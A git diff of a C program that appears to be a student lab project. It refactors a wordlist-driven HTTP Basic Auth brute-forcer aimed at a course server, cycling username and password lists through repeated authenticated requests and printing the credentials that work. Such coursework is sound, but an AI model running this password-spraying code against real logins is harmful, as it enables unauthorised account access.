@@ -14,24 +14,35 @@
 //Command example ./thing -u cs338 -p password -s 80 cs338.jeffondich.com/basicauth/ http-get 
 
 int http_main();
-int http_attempt(char *usr, char *pass, char* service);
+int connect_to_serv(struct addrinfo *servinfo);
+int http_attempt(char *usr, char *pass);
 // void http_output();
 char* to_base64(const unsigned char *data, size_t input_length);
 
 //HTTP Global vars
 int status;
 int sock;
-const struct sockaddr address;
 struct addrinfo hints;
 struct addrinfo *servinfo;
 int bytes_sent;
 char *host;
+char *dir; //Directory of the server to request from
+char *type; //Type of HTTP request: GET pr POST
 char *charPort; //c getaddrinfo() only accepts char* for port
 
-// char meth; //Request method eg. GET, POST
+//Server response type
+#define HTTP_AUTH_SUCCESS 0
+#define HTTP_AUTH_FAILURE 1
+#define HTTP_CONNECTION_CLOSED 2
+#define MAX_RESPONSE_SIZE 1000
+
+//HTTP Request/response
 char *passBuffer; //stores "username:password"
 char requestBuffer[500]; 
-char responseBuffer[30];
+char responseBuffer[MAX_RESPONSE_SIZE];
+
+
+
 
 //Base64 global vars (from https://stackoverflow.com/questions/342409/how-do-i-base64-encode-decode-in-c)
 static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
@@ -54,40 +65,16 @@ int http_main() {
     charPort = malloc((size_t)((ceil(log10(port))+1)*sizeof(char)));
     sprintf(charPort, "%d",port);
 
-    if (usrFilename != NULL && passFilename != NULL) {
-        while (fgets(usr, 256, usrFile) != NULL) {
-            if(usr[strlen(usr)-1] == '\n') {
-                usr[strlen(usr)-1] = '\0';
-            }                
-            while (fgets(pass, 256, passFile) != NULL) {
-                
-                // Replace new line with null to mark end of password
-                if(pass[strlen(pass)-1] == '\n') {
-                    pass[strlen(pass)-1] = '\0';
-                }
-                if (http_attempt(usr,pass,service) == 1) {
-                    break;
-                }   
-            }
-            rewind(passFile);
-        }
-        fclose(usrFile);
-        fclose(passFile);
-    } else if (usrFilename != NULL) {
-        return 0;
-    } else if (passFilename != NULL) {
-        return 0;
-    } else {
-        http_attempt(usr,pass,service);
+    //Create a string with proper request syntax (eg. "GET" from "http-get", "POST" from "http-post")
+    type = strstr(service,"-") + 1;
+    char *charPtr = type;
+    while (*charPtr != '\0') {
+        *charPtr = *charPtr - (char)32;
+        charPtr++;
     }
-    return 0;
-}
-
-int http_attempt(char *usr, char *pass, char* service) {
-    char *type = "GET";
 
     //Dir to GET from
-    char *dir = strstr(destination, "/");
+    dir = strstr(destination, "/");
     
     //Set the Host header
     if (dir == NULL) {
@@ -108,11 +95,61 @@ int http_attempt(char *usr, char *pass, char* service) {
         fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
         exit(1);
     }
-    
 
+    //Connect to server
+    connect_to_serv(servinfo);
+
+
+    //Here comes the spraying
+    int attemptStatus;
+    if (usrFilename != NULL && passFilename != NULL) {
+        while (fgets(usr, 256, usrFile) != NULL) {
+            if(usr[strlen(usr)-1] == '\n') {
+                usr[strlen(usr)-1] = '\0';
+            }                
+            while (fgets(pass, 256, passFile) != NULL) {
+                
+                // Replace new line with null to mark end of password
+                if(pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
+                attemptStatus = http_attempt(usr,pass);
+                if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
+                else if (attemptStatus == HTTP_CONNECTION_CLOSED) {
+                    connect_to_serv(servinfo);
+                    attemptStatus = http_attempt(usr,pass);
+                    if (attemptStatus == HTTP_AUTH_SUCCESS) {break;}
+                    else if (attemptStatus == HTTP_CONNECTION_CLOSED) {
+                        perror("Reconnection failed\n");
+                    }
+                }
+            }
+            rewind(passFile);
+        }
+        fclose(usrFile);
+        fclose(passFile);
+    } else if (usrFilename != NULL) {
+        while (fgets(pass, 256, passFile) != NULL) {
+            if (pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
+            attemptStatus = http_attempt(usr,pass);
+            if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
+            else if (attemptStatus == HTTP_CONNECTION_CLOSED) {connect_to_serv(servinfo);}
+        }
+    } else if (passFilename != NULL) {
+        while (fgets(pass, 256, usrFile) != NULL) {
+            if (pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
+            attemptStatus = http_attempt(usr,pass);
+            if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
+            else if (attemptStatus == HTTP_CONNECTION_CLOSED) {connect_to_serv(servinfo);}
+        }
+    } else {
+        attemptStatus = http_attempt(usr,pass);
+    }
+    freeaddrinfo(servinfo); //Servinfo struct no longer needed
+    return 0;
+}
+
+int connect_to_serv(struct addrinfo *servinfo) {
     //Connect to the destination (don't care if ipv4 or ipv6)
     struct addrinfo *p;
-    char ipstr[INET6_ADDRSTRLEN];
     for (p = servinfo; p != NULL; p = p->ai_next) {
 
         if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
@@ -127,10 +164,13 @@ int http_attempt(char *usr, char *pass, char* service) {
     
     if (p == NULL) {
         fprintf(stderr, "Connection failure: %s\n",strerror(errno));
-        exit(1);
+        exit(1); //Might not wanna exit right away. Should retry the connection!
     }
-    
+    return 0;
+}
 
+int http_attempt(char *usr, char *pass) {
+    
     //===Prepare HTTP request===
     //Concat usr and pass for base64 encoding
     sprintf(passBuffer,"%s:%s",usr,pass);
@@ -143,12 +183,9 @@ int http_attempt(char *usr, char *pass, char* service) {
     sprintf(requestBuffer,
               "%s %.250s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 "
                 "(Thing)\r\nConnection: "
-                "close\r\nAuthorization: Basic %s\r\n\r\n",
+                "keep-alive\r\nAuthorization: Basic %s\r\n\r\n",
               type, dir, host, encodedPass);
 
-   
-    freeaddrinfo(servinfo); //Servinfo struct no longer needed
-    
     //Send the HTTP request
     bytes_sent = send(sock, requestBuffer, strlen(requestBuffer), 0);
     if (bytes_sent != strlen(requestBuffer)) {
@@ -157,22 +194,21 @@ int http_attempt(char *usr, char *pass, char* service) {
     }
 
     //Receive the server's response
-    int bytesRecieved = recv(sock, responseBuffer, 30-1, 0);
+    int bytesRecieved = recv(sock, responseBuffer, MAX_RESPONSE_SIZE-1, 0);
     if (bytesRecieved == -1) {
         perror("recv failed\n");
         exit(1);
     } else if (bytesRecieved == 0) {
-        printf("Connection closed\n");
-        exit(1);
+        return HTTP_CONNECTION_CLOSED;
     } else {
         responseBuffer[bytesRecieved] = '\0';
-        //printf("Response:\n%s\n",responseBuffer);
+        // printf("Response:\n%s\n",responseBuffer);
         if (strstr(responseBuffer,"HTTP/1.1 2") != NULL) {
             printf("\033[0;32mAuthentication successful:\033[0m || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
-            return 1;
+            return HTTP_AUTH_SUCCESS;
         } else {
             printf("\033[0;31mAuthentication failure:\033[0m Username:%s, Password:%s\n", usr, pass);
-            return 0;
+            return HTTP_AUTH_FAILURE;
         }
     }
 
